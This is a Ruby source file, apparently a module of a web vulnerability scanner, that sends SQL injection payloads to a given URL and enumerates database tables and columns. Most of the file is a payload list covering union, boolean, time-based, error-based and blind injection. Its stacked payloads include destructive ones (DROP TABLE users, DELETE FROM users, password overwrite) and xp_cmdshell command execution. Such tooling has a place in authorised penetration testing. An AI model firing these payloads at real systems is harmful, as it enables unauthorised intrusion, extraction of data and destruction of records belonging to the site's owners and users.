require 'uri'
require_relative '../utils/network'
require_relative '../utils/colorize'

class SQLInjection
  PAYLOADS = {
    basic: [
      "' OR '1'='1",
      "' OR 1=1--",
      "' OR 1=1#",
      "' OR '1'='1'--",
      "' OR '1'='1'/*",
      "admin'--",
      "admin'#",
      "admin'/*",
      "' UNION SELECT NULL--",
      "1' AND '1'='1",
      "1' AND '1'='2",
      "' OR 'x'='x",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "') OR ('x'='x",
      "' OR 1=1 LIMIT 1--",
      "' OR '1'='1' UNION SELECT NULL--",
      "1' OR '1'='1",
      "1' OR '1'='1'--",
      "1' OR '1'='1'/*",
      "1' OR '1'='1'#",
      "' OR 1=1",
      "' OR '1'='1",
      "') OR ('1'='1",
      "1') OR ('1'='1",
      "1') OR ('1'='1'--",
      "1') OR ('1'='1'/*",
      "1') OR ('1'='1'#",
      "' OR 1=1--",
      "' OR 1=1#",
      "' OR 1=1/*",
      "' OR '1'='1'--",
      "' OR '1'='1'#",
      "' OR '1'='1'/*"
    ],
    union: [
      "' UNION SELECT NULL--",
      "' UNION SELECT 1,2,3--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION ALL SELECT NULL--",
      "' UNION ALL SELECT 1,2,3--",
      "' UNION SELECT user(),database(),version()--",
      "' UNION SELECT @@version,user(),database()--",
      "' UNION SELECT NULL,user(),NULL--",
      "' UNION SELECT NULL,NULL,version()--",
      "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
      "' UNION SELECT NULL FROM information_schema.tables--",
      "' UNION SELECT table_name FROM information_schema.tables--",
      "' UNION SELECT column_name FROM information_schema.columns--"
    ],
    boolean: [
      "' AND 1=1--",
      "' AND 1=2--",
      "' OR 1=1--",
      "' OR 1=2--",
      "' AND '1'='1",
      "' AND '1'='2",
      "' OR '1'='1",
      "' OR '1'='2",
      "1' AND 1=1--",
      "1' AND 1=2--",
      "1' OR 1=1--",
      "1' OR 1=2--",
      "') AND ('1'='1",
      "') AND ('1'='2",
      "') OR ('1'='1",
      "') OR ('1'='2",
      "' AND 1=1#",
      "' AND 1=2#",
      "' OR 1=1#",
      "' OR 1=2#",
      "' AND 'a'='a",
      "' AND 'a'='b",
      "' OR 'a'='a",
      "' OR 'a'='b"
    ],
    time: [
      "'; WAITFOR DELAY '00:00:05'--",
      "' OR SLEEP(5)--",
      "'; SELECT SLEEP(5)--",
      "' AND SLEEP(5)--",
      "'; WAITFOR DELAY '00:00:10'--",
      "' OR SLEEP(10)--",
      "'; SELECT SLEEP(10)--",
      "' AND SLEEP(10)--",
      "'; WAITFOR DELAY '00:00:03'--",
      "' OR SLEEP(3)--",
      "'; BENCHMARK(5000000,MD5(1))--",
      "' OR BENCHMARK(5000000,MD5(1))--",
      "'; WAITFOR DELAY '00:00:02'--",
      "' OR SLEEP(2)--",
      "'; SELECT pg_sleep(5)--",
      "' OR pg_sleep(5)--",
      "'; SELECT sleep(5)--",
      "' OR sleep(5)--"
    ],
    error: [
      "'",
      "')",
      "'))",
      "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND extractvalue(rand(),concat(0x3a,version()))--",
      "' AND updatexml(rand(),concat(0x3a,version()),null)--",
      "' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
      "' AND updatexml(1,concat(0x7e,version(),0x7e),1)--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "1' AND extractvalue(rand(),concat(0x3a,version()))--",
      "1' AND updatexml(rand(),concat(0x3a,version()),null)--",
      "') AND extractvalue(rand(),concat(0x3a,version()))--",
      "') AND updatexml(rand(),concat(0x3a,version()),null)--",
      "' AND extractvalue(1,concat(0x7e,database(),0x7e))--",
      "' AND updatexml(1,concat(0x7e,database(),0x7e),1)--",
      "' AND extractvalue(1,concat(0x7e,user(),0x7e))--",
      "' AND updatexml(1,concat(0x7e,user(),0x7e),1)--"
    ],
    blind: [
      "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      "' AND (SELECT SUBSTRING(@@version,1,1))='4'--",
      "' AND (SELECT LENGTH(database()))=5--",
      "' AND (SELECT LENGTH(database()))=10--",
      "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))=97--",
      "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))=98--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>10--",
      "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
      "' AND (SELECT SUBSTRING(user(),1,1))='a'--"
    ],
    stacked: [
      "'; DROP TABLE users--",
      "'; DELETE FROM users--",
      "'; UPDATE users SET password='hacked'--",
      "'; INSERT INTO users VALUES('admin','password')--",
      "'; EXEC xp_cmdshell('dir')--",
      "'; EXEC xp_cmdshell('whoami')--",
      "'; SELECT * FROM users; DROP TABLE users--",
      "'; SELECT * FROM users; DELETE FROM users--"
    ]
  }

  def self.test(url, payload_type = :basic)
    payloads = PAYLOADS[payload_type] || PAYLOADS[:basic]
    vulnerable = false
    
    payloads.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&test=#{URI.encode_www_form_component(payload)}" : "#{url}?test=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        body_lower = response.body.downcase
        if body_lower.include?("sql") || body_lower.include?("mysql") || body_lower.include?("error") || body_lower.include?("syntax")
          puts Colorize.red("Possible SQL Injection vulnerability!")
          puts Colorize.yellow("Payload: #{payload}")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.time_based_test(url)
    PAYLOADS[:time].each do |payload|
      begin
        start_time = Time.now
        test_url = "#{url}#{URI.encode_www_form_component(payload)}"
        Network.http_request(test_url)
        elapsed = Time.now - start_time
        
        if elapsed > 4
          puts Colorize.red("Possible Time-based SQLi! Response time: #{elapsed}s")
          return true
        end
      rescue
      end
    end
    false
  end

  def self.blind_test(url)
    PAYLOADS[:blind].each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&test=#{URI.encode_www_form_component(payload)}" : "#{url}?test=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        body_lower = response.body.downcase
        if body_lower.length > 0
          puts Colorize.yellow("Testing blind SQLi: #{payload}")
        end
      rescue
      end
    end
    false
  end

  def self.stacked_test(url)
    PAYLOADS[:stacked].each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&test=#{URI.encode_www_form_component(payload)}" : "#{url}?test=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.code != "200"
          puts Colorize.red("Possible Stacked Queries SQLi!")
          puts Colorize.yellow("Payload: #{payload}")
          return true
        end
      rescue
      end
    end
    false
  end

  def self.full_test(url)
    results = {
      basic: test(url, :basic),
      union: test(url, :union),
      boolean: test(url, :boolean),
      time: time_based_test(url),
      error: test(url, :error),
      blind: blind_test(url),
      stacked: stacked_test(url)
    }
    results
  end

  def self.enumerate_tables(url)
    payloads = [
      "' UNION SELECT table_name FROM information_schema.tables--",
      "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--"
    ]
    tables = []
    payloads.each do |payload|
      begin
        test_url = "#{url}#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        if response.body.include?("information_schema") || response.body.match(/table_name/i)
          puts Colorize.green("Possible table enumeration successful")
          tables << response.body
        end
      rescue
      end
    end
    tables
  end

  def self.enumerate_columns(url, table)
    payloads = [
      "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='#{table}'--",
      "' UNION SELECT column_name FROM information_schema.columns WHERE table_name=0x#{table.unpack('H*').first}--"
    ]
    columns = []
    payloads.each do |payload|
      begin
        test_url = "#{url}#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        if response.body.include?("column_name") || response.body.match(/column/i)
          puts Colorize.green("Possible column enumeration successful")
          columns << response.body
        end
      rescue
      end
    end
    columns
  end
end

